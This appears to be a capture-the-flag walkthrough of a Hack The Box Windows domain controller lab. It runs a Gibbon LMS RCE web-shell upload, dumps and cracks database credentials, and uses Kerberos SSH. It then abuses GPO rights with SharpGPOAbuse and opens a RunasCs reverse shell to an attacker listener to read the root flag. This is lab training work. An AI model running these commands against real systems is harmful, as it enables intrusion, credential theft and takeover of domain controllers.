## NMAP SCAN 
```
nmap -sSCV -p- 10.129.232.168
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-26 12:44 +0700
Nmap scan report for 10.129.232.168
Host is up (0.084s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 12:47:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60328/tcp open  msrpc         Microsoft Windows RPC
60332/tcp open  msrpc         Microsoft Windows RPC
60343/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-04-26T12:48:44
|_  start_date: N/A
```

![[Pasted image 20260426112500.png]]
there is a subdomain.....

even though there is no port 80 but the website is there....
on the website is found 3 users as students testimonials... 3 usernames....
RALPHIE, WANDA & MS. FIONA.... in fiona's testimonial there is a potential staff/user Ms. Frizzle....

Another user at Pricing tab... Mike Smith

```
## Welcome

*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours where your accounts will not be available. Please bear with us, and thank you for your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.
```

Full name is Fiona Frizzle.... so the student and staff are same ????? 
```
Powered by [Gibbon](https://gibbonedu.org) v25.0.00 | © [Ross Parker](http://rossparker.org) 2010-2026
```

potential rce and new user..... Ross Parker
gibbsom lms 25.0.0 is vulnerable to https://github.com/ulricvbs/gibbonlms-filewrite_rce/blob/main/gibbonlms_cmd_shell.py

and got the shell....
```
wget https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
--2026-04-26 13:13:53--  https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2649 (2.6K) [text/plain]
Saving to: ‘gibbonlms_cmd_shell.py’

gibbonlms_cmd_shell.py                                     100%[========================================================================================================================================>]   2.59K  --.-KB/s    in 0s      

2026-04-26 13:13:53 (19.6 MB/s) - ‘gibbonlms_cmd_shell.py’ saved [2649/2649]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ls
 Desktop   Documents   Downloads   exploits   gibbonlms_cmd_shell.py  'HTB BOXES'   Music   Pictures   Public   Templates   Videos
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 gibbonlms_cmd_shell.py http://frizzdc.frizz.htb 

[+] Successfully uploaded web shell to http://frizzdc.frizz.htb/Gibbons-LMS/qkNQ.php
[*] Here's your shell:
qkNQ.php?cmd=> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
operable program or batch file.
qkNQ.php?cmd=> dir
 Volume in drive C has no label.
 Volume Serial Number is D129-C3DA

 Directory of C:\xampp\htdocs\Gibbon-LMS
```

got creds fro data base..
```
qkNQ.php?cmd=> type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;
$caching = 10;
```

MrGibbonsDB:MisterGibbs!Parrot!?1

```
PSBI.php?cmd=> net user

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice             
The command completed successfully.
```

ok i got verified users now..... 

```
PSBI.php?cmd=> net localgroup administrators
[-] Server appears to have performed cleanup and payload is gone, re-establishing web shell.
[+] Successfully uploaded web shell to http://frizzdc.frizz.htb/Gibbons-LMS/CtPt.php
[*] Resubmitting your command.
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
v.frizzle
The command completed successfully.
```

so v.frizzle is an admin.... 

```python3 gibbonlms_cmd_shell.py http://frizzdc.frizz.htb

[+] Successfully uploaded web shell to http://frizzdc.frizz.htb/Gibbons-LMS/nrua.php
[*] Here's your shell:
nrua.php?cmd=> C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT username, passwordStrong, passwordStrongSalt FROM gibbonPerson;"
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```

got hash from mysql..... using nospace password trick...
use hash like this for john the ripper
```
`f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489`
```
```
john --format=dynamic='sha256($s.$p)' hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=sha256($s.$p) [256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
Jenni_Luvs_Magic23 (f.frizzle)     
1g 0:00:00:02 DONE (2026-04-26 14:26) 0.3623g/s 3993Kp/s 3993Kc/s 3993KC/s Jesus14jrj..Jeepers93
Use the "--show --format=dynamic=sha256($s.$p)" options to display all of the cracked passwords reliably
Session completed.
```
f.frizzle:Jenni_Luvs_Magic23..... 

```
sudo ntpdate 10.129.205.25 
2026-04-26 21:58:01.189761 (+0700) +0.023273 +/- 0.047795 10.129.205.25 s1 no-leap
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ netexec smb frizzdc.frizz.htb -k -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'          
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ netexec smb frizzdc.frizz.htb -k -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' --generate-krb5-file frizz.krb5
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] krb5 conf saved to: frizz.krb5
SMB         frizzdc.frizz.htb 445    frizzdc          [+] Run the following command to use the conf file: export KRB5_CONFIG=frizz.krb5
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cp frizz.krb5 /etc/krb5.conf 
cp: cannot create regular file '/etc/krb5.conf': Permission denied
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ export KRB5_CONFIG=frizz.krb5
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-getTGT 'frizz.htb/f.frizzle:Jenni_Luvs_Magic23'                                                                         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls
 Desktop   Documents   Downloads   exploits   f.frizzle.ccache   frizz.krb5  'HTB BOXES'   Music   Pictures   Public   Templates   Videos
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ KRB5CCNAME=f.frizzle.ccache    
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ssh -K f.frizzle@frizzdc.frizz.htb
The authenticity of host 'frizzdc.frizz.htb (10.129.205.25)' can't be established.
ED25519 key fingerprint is: SHA256:667C2ZBnjXAV13iEeKUgKhu6w5axMrhU346z2L2OE7g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'frizzdc.frizz.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
f.frizzle@frizzdc.frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@frizzdc.frizz.htb 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PowerShell 7.4.5
PS C:\Users\f.frizzle> dir

    Directory: C:\Users\f.frizzle

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r--          10/29/2024  7:31 AM                Desktop
d-r--          10/29/2024  7:27 AM                Documents
d-r--            5/8/2021  1:15 AM                Downloads
d-r--            5/8/2021  1:15 AM                Favorites
d-r--            5/8/2021  1:15 AM                Links
d-r--            5/8/2021  1:15 AM                Music
d-r--            5/8/2021  1:15 AM                Pictures
d----            5/8/2021  1:15 AM                Saved Games
d-r--            5/8/2021  1:15 AM                Videos

```

```
PS C:\Users\f.frizzle\Desktop> type user.txt
e0dde6caa3f1b90ebacb89d887684ecb
```

got user flag
```
Computer Name           :   FRIZZDC
   User Name               :   M.SchoolBus
   User Id                 :   1106
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   Desktop Administrator
   Last Logon              :   2/25/2025 2:02:08 PM
   Logons Count            :   852
   Password Last Set       :   10/29/2024 7:27:03 AM
```

using winPEAS i can see that if i get M.SchoolBus i can read roo.txt.....
```
Computer Name           :   FRIZZDC
   User Name               :   v.frizzle
   User Id                 :   1115
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   The Wizard
   Last Logon              :   4/26/2026 8:12:12 AM
   Logons Count            :   971
   Password Last Set       :   10/29/2024 7:27:04 AM

```
or v.frizzle who is admin 

```
PS C:\> ls -force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:41 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:41 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
```

-force for hidden folder
```
PS C:\> cd '$RECYCLE.BIN'
PS C:\$RECYCLE.BIN> ls
PS C:\$RECYCLE.BIN> ls -froce
Get-ChildItem: A parameter cannot be found that matches parameter name 'froce'.
PS C:\$RECYCLE.BIN> ls -force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

PS C:\$RECYCLE.BIN> cd S-1-5-21-2386970044-1145388522-2932701813-1103                                                                                                                                                                      
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```

good files first one in config and 2nd one has data....
lets get the files.... 

```
PS C:\> $bytes = [System.IO.File]::ReadAllBytes('C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z')
PS C:\> [BitConverter]::ToInt64($bytes, 8)
30416987
PS C:\> [datetime]::FromFileTimeUtc([BitConverter]::ToInt64($bytes, 16))

Tuesday, October 29, 2024 2:31:09 PM

PS C:\> [BitConverter]::ToInt32($bytes, 24)                             
60
PS C:\> [System.Text.Encoding]::Unicode.GetString($bytes, 28, 120)
C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z
PS C:\> $shell = New-Object -com shell.application                                                                           
PS C:\> $rb = $shell.Namespace(10)                
PS C:\> $rb.items()               

Application  : System.__ComObject
Parent       : System.__ComObject
Name         : wapt-backup-sunday.7z
Path         : C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z
GetLink      : 
GetFolder    : 
IsLink       : False
IsFolder     : False
IsFileSystem : True
IsBrowsable  : False
ModifyDate   : 10/24/2024 9:16:29 PM
Size         : 30416987
Type         : 7Z File
```
```
KRB5CCNAME=f.frizzle.ccache scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
$RE2XMEG.7z                                                                                                                                                                                              100%   29MB 631.3KB/s   00:47    
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ file wapt-backup-sunday.7z
wapt-backup-sunday.7z: 7-zip archive data, version 0.4
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 7z x wapt-backup-sunday.7z 

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:5 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 30416987 bytes (30 MiB)

Extracting archive: wapt-backup-sunday.7z
--
Path = wapt-backup-sunday.7z
Type = 7z
Physical Size = 30416987
Headers Size = 65880
Method = ARM64 LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 3

Everything is Ok                                                                 

Folders: 684
Files: 5384
Size:       141187501
Compressed: 30416987
```

in conf maybe passwd??
```
──(kali㉿kali)-[~/wapt/conf]
└─$ ls          
ca-192.168.120.158.crt  ca-192.168.120.158.pem  forward_ssl_auth.conf  require_ssl_auth.conf  uwsgi_params  waptserver.ini  waptserver.ini.template
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/wapt/conf]
└─$ cat waptserver.ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```
![[Pasted image 20260426140908.png]]

!suBcig@MehTed!R

got password... lets see whose is it since there are 4 users on the machine so all the users above are useless and new ones are 
f.frizzle
M.SchoolBus
v.frizzle
w.webservice

```
netexec smb frizzdc.frizz.htb -k -u users.txt -p '!suBcig@MehTed!R'  
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED 
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R 
```

so M.SchoolBus is the user we wanted... now lets get the root flag maybe...

impacket-getTGT 'frizz.htb/m.schoolbus:!suBcig@MehTed!R'

now update krb5.conf and add under realm 

```    
FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
        default_domain = frizz.htb
    }

```

then connect to ssh 
```
KRB5CCNAME=m.schoolbus.ccache ssh -K m.schoolbus@frizzdc.frizz.htb     
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PowerShell 7.4.5
PS C:\Users\M.SchoolBus>
```

we will use SharpGPOAbuse.exe and RunAs.exe 
runascs (https://github.com/antonioCoco/RunasCs/releases) download zip file 

sharp gpo to make us admin and runas to get a shell 
```
PS C:\Users\M.SchoolBus> New-GPO -Name EvilGP
                                                                                                                        
DisplayName      : EvilGP
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 9784d275-7b53-44b7-9897-82f811900ce9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 4/26/2026 10:20:47 AM
ModificationTime : 4/26/2026 10:20:47 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

PS C:\Users\M.SchoolBus> New-GPLink -Target "OU=Domain Controllers,DC=frizz,DC=htb" -Name "EvilGP"

GpoId       : 9784d275-7b53-44b7-9897-82f811900ce9
DisplayName : EvilGP
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2

PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "M.SchoolBus" --GPOName "EvilGP"
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "EvilGP" is: {9784D275-7B53-44B7-9897-82F811900CE9}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{9784D275-7B53-44B7-9897-82F811900CE9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Users\M.SchoolBus> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```


## To transfer using .ccache and scp in ssh 
```
KRB5CCNAME=f.frizzle.ccache scp -o GSSAPIAuthentication=yes RunasCs1.exe f.frizzle@frizz.htb:/Users/f.frizzle/
```
same transfer for sharpgpo

we are using different user because 
```
After adding the user to local `Administrators` group we need to relogin to inherit our new permissions, but `Administrators` can’t login to the host via `SSH`, so we can use the `RunasCs.exe` tool to run a command as the user and we can once again get a shell with our local `Administrator` user.
```

```
PowerShell 7.4.5
PS C:\Users\f.frizzle> .\RunasCs1.exe m.schoolbus '!suBcig@MehTed!R' cmd.exe -r 10.10.14.53:9999 

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-fdffb$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2500 created in background.
PS C:\Users\f.frizzle> 
```

before running the runascs run netcat on our machine 
```
rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.232.168] 50183
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
frizz\m.schoolbus

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
7fecec4ad7496408dcc6c67608d34d05
```

got the root flag